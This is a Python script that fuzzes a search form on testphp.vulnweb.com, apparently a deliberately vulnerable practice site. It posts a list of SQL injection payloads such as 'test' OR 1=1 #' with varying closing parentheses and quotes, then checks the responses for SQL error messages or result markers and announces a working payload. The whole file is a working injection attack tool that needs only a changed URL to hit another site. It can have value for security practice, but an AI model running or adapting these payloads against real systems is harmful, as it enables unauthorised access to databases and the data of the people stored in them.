import urllib.request
import urllib.parse

url = "http://testphp.vulnweb.com/search.php?test=query"


payloads = [
    "test' OR 1=1 #",          # Basic check
    "test') OR 1=1 #",         # Closing one parenthesis
    "test')) OR 1=1 #",        # Closing two
    "test', 1) OR 1=1 #",      # Closing function with a dummy integer argument
    "test', '1') OR 1=1 #",    # Closing function with a dummy string argument
    "test' -- ",               # Just trying to suppress error
    "test' #",                 # Just trying to suppress error
]

print(f"[*] Fuzzing {url}...\n")

for payload in payloads:
    try:
        # Prepare the data (simulating a form submission)
        data = urllib.parse.urlencode({
            'searchFor': payload, 
            'goButton': 'go'
        }).encode('utf-8')

        # Send request
        req = urllib.request.Request(url, data=data)
        with urllib.request.urlopen(req) as response:
            page_content = response.read().decode('utf-8')

            # Check for the SQL error
            if "Error: You have an error in your SQL syntax" in page_content:
                print(f"[X] FAILED (Syntax Error): {payload}")
            
            # Check for success indicators (Pictures/Results)
            elif "Total results:" in page_content or "Pictures" in page_content:
                print(f"\n[!!!] JACKPOT! Payload found: {payload}")
                print(f"[+] Copy and paste this exact string into your browser.")
                break 
            
            else:
                print(f"[?] NO ERROR (But maybe no results?): {payload}")

    except Exception as e:
        print(f"Connection error: {e}")

print("\n[*] Fuzzing complete.")
